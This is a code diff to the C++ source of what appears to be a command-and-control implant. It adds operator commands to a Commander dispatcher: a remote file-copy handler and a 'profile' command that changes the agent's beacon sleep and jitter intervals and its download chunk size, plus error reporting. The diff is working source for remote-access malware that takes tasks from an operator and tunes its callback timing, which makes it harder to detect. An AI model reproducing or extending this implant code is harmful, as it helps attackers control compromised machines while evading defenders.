@@ -23,14 +23,17 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 		case COMMAND_CD:        
 			this->CmdCd(CommandId, inPacker, outPacker); break;
 	
-		case COMMAND_CP:        
-			break;
+		case COMMAND_CP:   
+			this->CmdCp(CommandId, inPacker, outPacker); break;
 		
 		case COMMAND_DOWNLOAD:
 			this->CmdDownload(CommandId, inPacker, outPacker); break;
 
 		case COMMAND_DOWNLOAD_STATE:
 			this->CmdDownloadState(CommandId, inPacker, outPacker); break;
+
+		case COMMAND_PROFILE:
+			this->CmdProfile(CommandId, inPacker, outPacker); break;
 
 		case COMMAND_PWD:       
 			this->CmdPwd(CommandId, inPacker, outPacker); break;
@@ -55,6 +58,26 @@ void Commander::CmdCd(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		outPacker->Pack32(commandId);
 		outPacker->PackBytes((PBYTE)path, pathSize);
 	}
+	else {
+		outPacker->Pack32(COMMAND_ERROR);
+		outPacker->Pack32(TEB->LastErrorValue);
+	}
+}
+
+void Commander::CmdCp(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG srcSize = 0;
+	CHAR* src     = inPacker->UnpackStringA(&srcSize);
+	ULONG dstSize = 0;
+	CHAR* dst     = inPacker->UnpackStringA(&dstSize);
+	ULONG taskId  = inPacker->Unpack32();
+
+	outPacker->Pack32(taskId);
+
+	BOOL result = ApiWin->CopyFile(src, dst, FALSE);
+	if (result) {
+		outPacker->Pack32(commandId);
+	}      
 	else {
 		outPacker->Pack32(COMMAND_ERROR);
 		outPacker->Pack32(TEB->LastErrorValue);
@@ -118,6 +141,37 @@ void Commander::CmdDownloadState(ULONG commandId, Packer* inPacker, Packer* outP
 	else {
 		outPacker->Pack32(COMMAND_ERROR);
 		outPacker->Pack32(2);
+	}
+}
+
+void Commander::CmdProfile(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG subcommand = inPacker->Unpack32();
+
+	if (subcommand == 1) {
+		ULONG sleep  = inPacker->Unpack32();
+		ULONG jitter = inPacker->Unpack32();
+		ULONG taskId = inPacker->Unpack32();
+
+		agent->config->sleep_delay  = sleep;
+		agent->config->jitter_delay = jitter;
+
+		outPacker->Pack32(taskId);
+		outPacker->Pack32(COMMAND_PROFILE);
+		outPacker->Pack32(subcommand);
+		outPacker->Pack32(agent->config->sleep_delay);
+		outPacker->Pack32(agent->config->jitter_delay);
+	} 
+	else if (subcommand == 2) {
+		ULONG size   = inPacker->Unpack32();
+		ULONG taskId = inPacker->Unpack32();
+		
+		agent->downloader->chunkSize = size;
+
+		outPacker->Pack32(taskId);
+		outPacker->Pack32(COMMAND_PROFILE);
+		outPacker->Pack32(subcommand);
+		outPacker->Pack32(agent->downloader->chunkSize);
 	}
 }
 
